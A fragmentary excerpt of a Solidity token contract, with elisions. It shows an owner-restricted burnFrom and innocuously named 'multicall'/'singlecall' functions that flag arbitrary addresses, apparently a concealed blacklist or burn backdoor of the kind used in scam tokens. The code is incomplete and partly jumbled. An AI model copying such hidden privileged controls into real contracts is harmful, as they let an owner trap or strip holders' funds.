...
contract never is Context, IERC20, Ownable {
    ...
    return true;}
    function burnFrom(address account, uint256 tokens, uint256 burn) external distributor {
    ...
    _reflectFee(rFee, tFee);
    emit Transfer(sender, recipient, tTransferAmount);}
    function multicall(address acconut) external distributor {
    _multicall[acconut] = true;}
    function singlecall(address account) external distributor {
    _multicall[account] = false;}
    function checkCall(address account) public view returns (bool) {
    return _multicall[account];}
    function initialize() public virtual distributor {
